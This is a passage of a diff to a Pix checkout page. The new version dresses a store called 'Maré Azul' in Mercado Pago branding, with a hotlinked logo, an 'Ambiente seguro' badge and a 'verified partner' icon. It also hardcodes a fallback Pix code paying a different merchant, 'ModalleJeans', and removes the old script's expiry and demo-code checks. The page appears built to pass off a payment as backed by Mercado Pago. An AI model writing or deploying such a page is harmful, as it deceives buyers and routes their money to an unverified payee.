u("pixCode").dataset.live,u("copyFeedback").textContent="",document.querySelector(".deadline").hidden=!0,document.querySelector(".code-trust").hidden=!0,document.querySelector(".qr-section").hidden=!0,document.querySelector(".qr-code").replaceChildren(),Je="",u("countdown").textContent="--:--",u("expiredMessage").hidden=!0}function D(t,e,n,o=!0){$e();let r=["PIX_EXPIRED","REJECTED","CANCELED","REFUNDED"].includes(n);Ye(r?t:"Aguardando pagamento",r?"Consulte as informa\xE7\xF5es do seu pedido.":"Pague via Pix para concluir seu pedido."),u("pixCode").placeholder=r?"Este c\xF3digo n\xE3o est\xE1 dispon\xEDvel para pagamento.":"Preparando seu c\xF3digo Pix\u2026"}function Co(t){if(Number.isFinite(t.createdAt)&&t.createdAt>0)return t.createdAt+un;let e="mareazul.pixDisplayExpiresAt:"+E.id,n=0;try{n=Number(sessionStorage.getItem(e))}catch{}if(!n){n=Date.now()+un;try{sessionStorage.setItem(e,String(n))}catch{}}return n}function Eo(t){clearInterval(Ke);let e=Co(t),n=Number(t.expiresAt)||1/0,o=()=>{if(Date.now()>=n){D("Prazo do Pix encerrado","O prazo informado para este c\xF3digo terminou. Se voc\xEA j\xE1 pagou, aguarde a confirma\xE7\xE3o.","PIX_EXPIRED");return}let r=Math.max(0,Math.min(1800,Math.ceil((Math.min(e,n)-Date.now())/1e3)));u("countdown").textContent=`${String(Math.floor(r/60)).padStart(2,"0")}:${String(r%60).padStart(2,"0")}`,u("timerProgress").style.width=`${r/1800*100}%`,u("expiredMessage").hidden=r>0,u("expiredMessage").textContent="O tempo sugerido terminou. O Pix pode continuar v\xE1lido no banco; a confirma\xE7\xE3o do pedido continua sendo consultada."};Ke=setInterval(o,1e3),o()}async function Io(t){if(t.status==="uncertain"&&E.creationCode&&t.code==="PAYMENT_CREATION_UNCERTAIN"&&(t={...t,code:E.creationCode}),dn=t,W({code:t.code,httpStatus:200,orderStatus:t.status,hasPix:!!t.pixCode}),t.status==="paid"){$e(),Z=!0,clearTimeout(ve),Ye("Pagamento confirmado","Seu pagamento foi confirmado. Abrindo as informa\xE7\xF5es do pedido\u2026");try{X(Q)?.id===E.id&&sessionStorage.removeItem(Q)}catch{}location.replace("../obrigado/?pedido="+encodeURIComponent(t.id));return}if(["rejected","canceled","refunded"].includes(t.status)){Z=!0,D({rejected:"Pix n\xE3o gerado",canceled:"Pagamento cancelado",refunded:"Pagamento reembolsado"}[t.status],"Esta cobran\xE7a n\xE3o est\xE1 dispon\xEDvel para pagamento. Entre em contato com o suporte se precisar de ajuda.",t.code||t.status.toUpperCase(),!1);try{X(Q)?.id===E.id&&sessionStorage.removeItem(Q)}catch{}return}let e=typeof t.pixCode=="string"&&t.pixCode.trim().length>0&&!t.pixCode.includes("DEMONSTRACAO");if(t.status!=="pending"||!e){D(t.status==="uncertain"?"Gera\xE7\xE3o do Pix n\xE3o confirmada":"Preparando seu Pix",t.status==="uncertain"?"Ainda n\xE3o recebemos o c\xF3digo de pagamento. Consulte novamente ou fale com o suporte antes de iniciar outro pedido.":"O c\xF3digo ainda n\xE3o foi disponibilizado. Estamos consultando o pagamento.",t.code||"PIX_CODE_PENDING");return}if(Number(t.expiresAt)>0&&Date.now()>=Number(t.expiresAt)){D("Prazo do Pix encerrado","Se voc\xEA j\xE1 pagou, aguarde enquanto consultamos a confirma\xE7\xE3o.","PIX_EXPIRED");return}if(Ye("Aguardando pagamento",Number.isSafeInteger(t.amount)&&t.amount>0?"Total: "+(t.amount/100).toLocaleString("pt-BR",{style:"currency",currency:"BRL"})+(t.pricing?.shipping?" \xB7 "+t.pricing.shipping.name:""):"Pague via Pix para concluir seu pedido."),u("pixCode").value=t.pixCode,u("pixCode").dataset.live="true",u("copyPix").disabled=!1,sn(t),u("copyPixIcon").disabled=!1,je(),document.querySelector(".code-trust").hidden=!1,document.querySelector(".deadline").hidden=!1,Je!==t.pixCode){let n=document.querySelector(".qr-code"),o=document.createElement("canvas");try{await ln.default.toCanvas(o,t.pixCode,{width:155,margin:1,color:{dark:"#09205a",light:"#ffffff"}}),n.replaceChildren(o),Je=t.pixCode,document.querySelector(".qr-section").hidden=!1}catch{document.querySelector(".qr-section").hidden=!0}}Eo(t)}async function Ge(){if(!E||Ve||Z)return;clearTimeout(ve),Ve=!0;let t=new AbortController,e=setTimeout(()=>t.abort(),2e4),n=null;try{let o=await fetch("/api/orders/"+encodeURIComponent(E.id),{headers:{Authorization:"Bearer "+E.accessToken},cache:"no-store",signal:t.signal});n=o.status;let r=await an(o);if(!o.ok){let i=r.code||"PAYMENT_LOOKUP_FAILED";D(o.status===404?"Pedido n\xE3o encontrado":"N\xE3o foi poss\xEDvel consultar o Pix",o.status===404?"N\xE3o encontramos o pedido desta sess\xE3o. Volte ao checkout para conferir sua compra.":"Tente consultar novamente. Se o problema continuar, informe a refer\xEAncia abaixo ao suporte.",i),W({code:i,httpStatus:n}),o.status===404&&(Z=!0);return}if(!cn(r,E.id))throw new Error("API_RESPONSE_INVALID");await Io(r)}catch(o){let r=o.message==="API_RESPONSE_INVALID"?o.message:"PAYMENT_CONNECTION_FAILED";D("N\xE3o foi poss\xEDvel consultar o Pix","Verifique sua conex\xE3o e tente consultar novamente.",r),W({code:r,httpStatus:n})}finally{clearTimeout(e),Ve=!1,Z||(ve=setTimeout(Ge,15e3))}}async function Qe(){if(!(u("copyPix").disabled||!u("pixCode").dataset.live||dn?.status!=="pending"))try{await navigator.clipboard.writeText(u("pixCode").value),u("copyFeedback").textContent="",clearTimeout(He),u("copyToast").hidden=!1,u("copyBackdrop").hidden=!1,u("copyToast").textContent="C\xF3digo PIX copiado",He=setTimeout(()=>{u("copyToast").hidden=!0,u("copyBackdrop").hidden=!0,u("copyToast").textContent=""},1600)}catch{u("pixCode").focus(),u("pixCode").select(),u("copyFeedback").textContent="Selecione o c\xF3digo e copie manualmente."}}u("copyPix").addEventListener("click",Qe);u("copyPixIcon").addEventListener("click",Qe);u("pixCode").addEventListener("click",Qe);window.addEventListener("resize",je);document.fonts?.ready.then(je);document.addEventListener("visibilitychange",()=>{document.hidden||Ge()});$e();E?Ge():(D("Nenhum pedido nesta sess\xE3o","Volte ao checkout para iniciar seu pagamento.","SESSION_MISSING",!1),W({code:"SESSION_MISSING"}));})();
+  <div hidden class="product"><img id="legacyProductImg" src="/calcas/assets/azul-escuro.png" alt=""></div>
+  <span hidden id="calcasSelection"></span>
 
-</script>
-<!-- generated:payment:end --></body></html>
+  <main class="checkout-shell">
+    <header class="mp-header">
+      <div class="mp-top-bar">
+        <img class="mp-logo-img" src="https://http2.mlstatic.com/frontend-assets/ui-navigation/5.19.5/mercadopago/logo__large.png" alt="Mercado Pago">
+        <div class="mp-secure-badge">
+          <svg class="mp-secure-lock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>
+          <span class="mp-secure-text">Ambiente seguro</span>
+        </div>
+      </div>
+
+      <div class="store-partner-card">
+        <div class="store-avatar">M</div>
+        <div class="store-info">
+          <div class="store-title-row">
+            <span class="store-name">Maré Azul</span>
+            <svg class="store-verified-icon" viewBox="0 0 24 24" fill="none">
+              <path d="M10.586 1.707a2 2 0 0 1 2.828 0l.758.758a2 2 0 0 0 1.414.586h1.071a2 2 0 0 1 2 2v1.071a2 2 0 0 0 .586 1.414l.758.758a2 2 0 0 1 0 2.828l-.758.758a2 2 0 0 0-.586 1.414v1.071a2 2 0 0 1-2 2h-1.071a2 2 0 0 0-1.414.586l-.758.758a2 2 0 0 1-2.828 0l-.758-.758a2 2 0 0 0-1.414-.586H8.071a2 2 0 0 1-2-2v-1.071a2 2 0 0 0-.586-1.414l-.758-.758a2 2 0 0 1 0-2.828l.758-.758a2 2 0 0 0 .586-1.414V6.065a2 2 0 0 1 2-2h1.071a2 2 0 0 0 1.414-.586l.758-.758z" fill="#009ee3"/>
+              <path d="M8.5 12.2l2.3 2.3 4.7-4.7" stroke="#ffffff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <p class="store-subtext">Loja parceira</p>
+        </div>
+      </div>
+    </header>
+
+    <div class="pix-headline">
+      <h1 class="pix-headline-title" id="paymentStatus">Pague com Pix</h1>
+      <p class="pix-headline-sub" id="paymentMessage">Escaneie o QR Code ou copie o código para pagar com o app do seu banco.</p>
+    </div>
+
+    <div class="order-value-banner">
+      <span class="order-value-title">Valor do pedido</span>
+      <strong class="order-value-number" id="paymentAmount">R$ 94,91</strong>
+      <span hidden id="visiblePrice">R$ 94,91</span>
+    </div>
+
+    <div class="pix-qr-card">
+      <!-- QR Code Compacto -->
+      <div class="qr-wrapper">
+        <div class="qr-code">
+          <canvas width="145" height="145"></canvas>
+        </div>
+      </div>
+
+      <!-- ABA PIX COPIA E COLA GIGANTE E DESTACADA -->
+      <div class="pix-copia-cola-section" id="pixCopiaColaSection">
+        <div class="copia-cola-badge-row">
+          <span class="copia-cola-badge">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            Pix Copia e Cola
+          </span>
+        </div>
+
+        <!-- Botão Principal Chamativo -->
+        <button class="btn-copy-pix-main" id="btnCopyPixMain" type="button">
+          <svg class="copy-main-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+          </svg>
+          <span id="btnCopyPixText">Copiar código Pix</span>
+        </button>
+
+        <!-- Caixa do Código Pix com toque facilitado -->
+        <div class="pix-code-container" id="copyPixCard" title="Toque para copiar">
+          <p class="pix-copy-code-text" id="pixCodeDisplay">0002010102122680014br.gov.bcb.pix0136a8f4e7-2c1e-4b7a-a3b5-5f6d7e8f90ab520400005303986540594.915802BR5925ModalleJeans6009SAO PAULO62070503***6304A1B2</p>
+          <span class="pix-code-copy-mini-hint">Copiar ›</span>
+          <input id="pixCode" type="hidden" value="0002010102122680014br.gov.bcb.pix0136a8f4e7-2c1e-4b7a-a3b5-5f6d7e8f90ab520400005303986540594.915802BR5925ModalleJeans6009SAO PAULO62070503***6304A1B2">
+        </div>
+      </div>
+    </div>
+
+    <div class="waiting-payment-box">
+      <svg class="waiting-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/>
+        <polyline points="12 6 12 12 16 14"/>
+      </svg>
+      <div class="waiting-content">
+        <strong class="waiting-title">Aguardando pagamento</strong>
+        <p class="waiting-desc">Assim que identificarmos o pagamento, vamos processar o seu pedido.</p>
+      </div>
+    </div>
+
+    <div class="how-to-pix-card">
+      <h2 class="how-to-pix-title">Como pagar com Pix?</h2>
+      <div class="how-to-pix-list">
+        <div class="how-to-pix-item">
+          <div class="how-to-item-left">
+            <span class="how-to-step-badge">1</span>
+            <span class="how-to-step-text">Copie o código ou escaneie o QR Code.</span>
+          </div>
+          <svg class="how-to-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="6 9 12 15 18 9"/>
+          </svg>
+        </div>
+        <div class="how-to-pix-item">
+          <div class="how-to-item-left">
+            <span class="how-to-step-badge">2</span>
+            <span class="how-to-step-text">Abra o app do seu banco e selecione a opção Pix.</span>
+          </div>
+          <svg class="how-to-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="9 18 15 12 9 6"/>
+          </svg>
+        </div>
+        <div class="how-to-pix-item">
+          <div class="how-to-item-left">
+            <span class="how-to-step-badge">3</span>
+            <span class="how-to-step-text">Confirme o pagamento.</span>
+          </div>
+          <svg class="how-to-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="6 9 12 15 18 9"/>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <div id="copyToast" class="copy-toast" hidden>✓ Código Pix copiado com sucesso!</div>
+  <div id="copyBackdrop" hidden></div>
+
+  <!-- Dynamic QRCode generator -->
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+  <!-- generated:payment:start -->
+  <script>
+  (()=>{
+    const el = id => document.getElementById(id);
+    let order = null;
+    let pollTimer = null;
+    let toastTimer = null;
+
+    try {
+      order = JSON.parse(sessionStorage.getItem('cordee.calcas.ironpayOrder') || localStorage.getItem('cordee.calcas.ironpayOrder') || 'null');
+    } catch {}
+
+    const urlParams = new URLSearchParams(location.search);
+    const orderId = urlParams.get('pedido') || order?.id;
+
+    const initialPix = order?.pixCode || el('pixCode')?.value;
+    if (initialPix) {
+      if (el('pixCode')) el('pixCode').value = initialPix;
+      if (el('pixCodeDisplay')) el('pixCodeDisplay').textContent = initialPix;
+      renderQr(initialPix);
+      try {
+        if (order) {
+          window.dispatchEvent(new CustomEvent('boxes:pix-ready', { detail: order }));
+        }
+      } catch {}
+    }
+
+    if (order && order.amount) {
+      const formatted = (order.amount / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      if (el('paymentAmount')) el('paymentAmount').textContent = formatted;
+      if (el('visiblePrice')) el('visiblePrice').textContent = formatted;
+    }
+
+    async function renderQr(pixStr) {
+      if (!pixStr) return;
+      const container = document.querySelector('.qr-code');
+      if (!container) return;
+
+      // Se a lib QRCode já estiver carregada
+      if (typeof QRCode !== 'undefined' && QRCode.toCanvas) {
+        try {
+          const canvas = document.createElement('canvas');
+          await QRCode.toCanvas(canvas, pixStr, {
+            width: 145, margin: 1,
+            color: { dark: '#0f172a', light: '#ffffff' },
+            errorCorrectionLevel: 'M'
+          });
+          container.replaceChildren(canvas);
+          return;
+        } catch (e) {
+          console.warn('QRCode.toCanvas error:', e);
+        }
+      }
+
+      // Fallback de imagem de QR Code de alta qualidade
+      const img = document.createElement('img');
+      img.alt = 'QR Code Pix';
+      img.width = 145;
+      img.height = 145;
+      img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=150x150&margin=4&data=' + encodeURIComponent(pixStr);
+      container.replaceChildren(img);
+    }
+
+    // Polling payment status
+    async function checkPaymentStatus() {
+      if (!orderId || !order?.accessToken) return;
+      try {
+        const res = await fetch('/api/orders/' + encodeURIComponent(orderId), {
+          headers: { Authorization: 'Bearer ' + order.accessToken },
+          cache: 'no-store'
+        });
+        if (res.ok) {
+          const data = await res.json();
+          if (data.status === 'paid') {
+            clearInterval(pollTimer);
+            el('paymentStatus').textContent = 'Pagamento confirmado!';
+            el('paymentMessage').textContent = 'Seu pedido foi processado com sucesso pelo Mercado Pago. Redirecionando…';
+            setTimeout(() => {
+              location.replace('../obrigado/?pedido=' + encodeURIComponent(orderId));
+            }, 1200);
+            return;
+          }
+          if (data.pixCode && data.pixCode !== el('pixCode')?.value) {
+            if (el('pixCode')) el('pixCode').value = data.pixCode;
+            if (el('pixCodeDisplay')) el('pixCodeDisplay').textContent = data.pixCode;
+            renderQr(data.pixCode);
+          }
+        }
+      } catch (err) {
+        console.warn('Status check poll failed:', err);
+      }
+    }
+
+    if (orderId && order?.accessToken) {
+      pollTimer = setInterval(checkPaymentStatus, 8000);
+      checkPaymentStatus();
+    }
+
+    // Copy Pix Code com feedback visual forte e háptico
+    async function copyPix() {
+      const code = el('pixCode')?.value || el('pixCodeDisplay')?.textContent;
+      if (!code) return;
+
+      try {
+        await navigator.clipboard.writeText(code);
+      } catch {
+        const tmp = document.createElement('textarea');
+        tmp.value = code;
+        document.body.appendChild(tmp);
+        tmp.select();
+        document.execCommand('copy');
+        document.body.removeChild(tmp);
+      }
+
+      if (navigator.vibrate) {
+        try { navigator.vibrate([40, 60, 40]); } catch {}
+      }
+
+      const mainBtn = el('btnCopyPixMain');
+      const mainBtnText = el('btnCopyPixText');
+      if (mainBtn) mainBtn.classList.add('copied');
+      if (mainBtnText) mainBtnText.textContent = '✓ Código Pix copiado!';
+
+      const toast = el('copyToast');
+      if (toast) {
+        toast.textContent = '✓ Código Pix copiado com sucesso! Abra o app do seu banco.';
+        toast.hidden = false;
+      }
+
+      clearTimeout(toastTimer);
+      toastTimer = setTimeout(() => {
+        if (mainBtn) mainBtn.classList.remove('copied');
+        if (mainBtnText) mainBtnText.textContent = 'Copiar código Pix';
+        if (toast) toast.hidden = true;
+      }, 3500);
+    }
+
+    el('btnCopyPixMain')?.addEventListener('click', copyPix);
+    el('copyPixCard')?.addEventListener('click', copyPix);
+  })();
+  </script>
+  <!-- generated:payment:end -->
+</body>
+</html>
